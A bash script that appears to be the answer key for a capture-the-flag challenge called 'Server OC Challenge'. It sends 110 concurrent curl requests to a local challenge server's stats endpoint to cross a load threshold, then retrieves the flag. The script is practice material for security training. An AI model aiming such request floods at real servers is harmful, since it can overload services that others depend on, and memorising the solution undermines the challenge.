#!/bin/bash

# Server OC Challenge - Bash Solution Script
# This script sends multiple concurrent requests to overclock the server

# Challenge URL (default to localhost, can be overridden)
CHALLENGE_URL="${1:-http://localhost:3000}"

echo "===================================================================="
echo "Server OC Challenge - Bash Solution Script"
echo "===================================================================="
echo "Target: $CHALLENGE_URL"
echo ""

# Function to check server stats
check_stats() {
    echo "[*] Checking server stats..."
    curl -s "${CHALLENGE_URL}/api/stats" | jq '.' 2>/dev/null || curl -s "${CHALLENGE_URL}/api/stats"
    echo ""
}

# Function to get the flag
get_flag() {
    echo "[*] Attempting to retrieve the flag..."
    response=$(curl -s "${CHALLENGE_URL}/api/flag")
    echo "$response" | jq '.' 2>/dev/null || echo "$response"
    
    # Check if we got the flag
    if echo "$response" | grep -q "CTF{"; then
        echo ""
        echo "===================================================================="
        echo "[+] SUCCESS! Flag retrieved!"
        flag=$(echo "$response" | jq -r '.flag' 2>/dev/null || echo "$response" | grep -o 'CTF{[^}]*}')
        echo "[+] $flag"
        echo "===================================================================="
        return 0
    else
        echo ""
        echo "[-] Failed to get the flag. Try running the script again."
        return 1
    fi
}

# Main solution
echo "[1] Checking initial server stats..."
check_stats

echo "[2] Overclocking the server (sending 100+ concurrent requests)..."
echo "[*] Sending requests in background..."

# Send 110 concurrent requests to ensure we meet the threshold
for i in {1..110}; do
    curl -s "${CHALLENGE_URL}/api/stats" > /dev/null &
done

# Wait for all background jobs to complete
wait

echo "[+] All requests sent!"
echo ""

# Small delay to ensure server processed all requests
sleep 1

echo "[3] Checking server stats after overclocking..."
check_stats

echo "[4] Retrieving the flag..."
get_flag

exit_code=$?

echo ""
if [ $exit_code -eq 0 ]; then
    echo "[+] Challenge solved successfully!"
else
    echo "[-] Challenge not solved. You might need to:"
    echo "    1. Run the script again"
    echo "    2. Increase the number of requests"
    echo "    3. Reduce the delay between attempts"
fi

exit $exit_code
